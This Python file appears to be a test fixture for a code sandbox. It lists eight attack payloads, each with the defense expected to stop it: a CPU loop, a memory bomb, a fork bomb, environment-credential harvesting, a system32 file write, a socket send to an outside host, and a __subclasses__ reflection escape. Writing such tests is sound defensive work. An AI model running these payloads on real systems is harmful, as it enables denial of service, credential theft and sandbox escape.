"""
Malicious Code Attack Test Suite
Contains representative exploit payloads targeting sandbox isolation:
1. Infinite Loop (CPU exhaustion)
2. Memory Allocation Bomb (RAM exhaustion)
3. Fork Bomb (Process table exhaustion)
4. Environment Variable Stealing (Host credential leakage)
5. Filesystem Unauthorized Write (File integrity violation)
6. Socket / Network Connection (Data exfiltration)
7. Python Reflection / Metaprogramming Sandbox Escape (__subclasses__ traversal)
8. Obfuscated Eval / Exec Invocation (Dynamic code execution)
"""

from typing import List, Dict, Any

ATTACK_PAYLOADS: List[Dict[str, Any]] = [
    {
        "attack_id": "ATK-01",
        "name": "Infinite CPU Loop",
        "category": "Resource Exhaustion (CPU)",
        "description": "Unbounded while loop attempting to peg CPU core and block test grading queue.",
        "code": """# Attempt to peg CPU
count = 0
while True:
    count += 1
""",
        "expected_defense": "Wall-Clock Process Timeout (2.0s limit)"
    },
    {
        "attack_id": "ATK-02",
        "name": "Memory Allocation Bomb",
        "category": "Resource Exhaustion (RAM)",
        "description": "Massive exponential list/string allocation attempting host OOM kill.",
        "code": """# Attempt to consume all host memory
chunks = []
for _ in range(500):
    chunks.append("A" * (20 * 1024 * 1024)) # 10 GB total
""",
        "expected_defense": "Memory Limit / Process Timeout Containment"
    },
    {
        "attack_id": "ATK-03",
        "name": "Process Fork Bomb",
        "category": "Process Exhaustion",
        "description": "Spawns infinite child processes via os.fork() to exhaust PID table.",
        "code": """import os
while True:
    try:
        os.fork()
    except Exception:
        pass
""",
        "expected_defense": "AST Security Screening (Banned module 'os')"
    },
    {
        "attack_id": "ATK-04",
        "name": "Environment Variable Harvesting",
        "category": "Credential Exfiltration",
        "description": "Attempts to inspect os.environ for host API keys, DB credentials, or AWS tokens.",
        "code": """import os
stolen_env = dict(os.environ)
if "AWS_SECRET_ACCESS_KEY" in stolen_env:
    print("LEAKED_KEY")
""",
        "expected_defense": "AST Security Screening & Sanitized Minimal Subprocess Environment"
    },
    {
        "attack_id": "ATK-05",
        "name": "Host Filesystem Overwrite",
        "category": "Filesystem Tampering",
        "description": "Attempts to open and write malicious payload to host operating system path.",
        "code": """# Attempt to overwrite host file
with open("C:/Windows/system32/evil.txt", "w") as f:
    f.write("COMPROMISED")
""",
        "expected_defense": "AST Security Screening (Banned builtin 'open()')"
    },
    {
        "attack_id": "ATK-06",
        "name": "Network Socket Exfiltration",
        "category": "Network Egress",
        "description": "Attempts to establish TCP socket connection to external C2 server.",
        "code": """import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(1.0)
s.connect(("8.8.8.8", 53))
s.sendall(b"exfiltrating_data")
s.close()
""",
        "expected_defense": "AST Security Screening (Banned module 'socket') & No-network policy"
    },
    {
        "attack_id": "ATK-07",
        "name": "Metaprogramming / Reflection Escape",
        "category": "Sandbox Escape",
        "description": "Traverses Python object hierarchy via dunder attributes to resurrect banned modules.",
        "code": """# Reflection escape via object subclasses
classes = ().__class__.__bases__[0].__subclasses__()
for cls in classes:
    if "Popen" in cls.__name__:
        cls(["notepad.exe"])
""",
        "expected_defense": "AST Security Screening (Banned dunders '__bases__', '__subclasses__')"
    },
    {
        "attack_id": "ATK-08",
        "name": "Dynamic Builtin Eval/Exec",
        "category": "Arbitrary Code Execution",
        "description": "Invokes eval() to execute obfuscated bytecode or dynamic string payloads.",
        "code": """# Dynamic eval call
payload = "1 + 1"
res = eval(payload)
""",
        "expected_defense": "AST Security Screening (Banned builtin 'eval()')"
    }
]
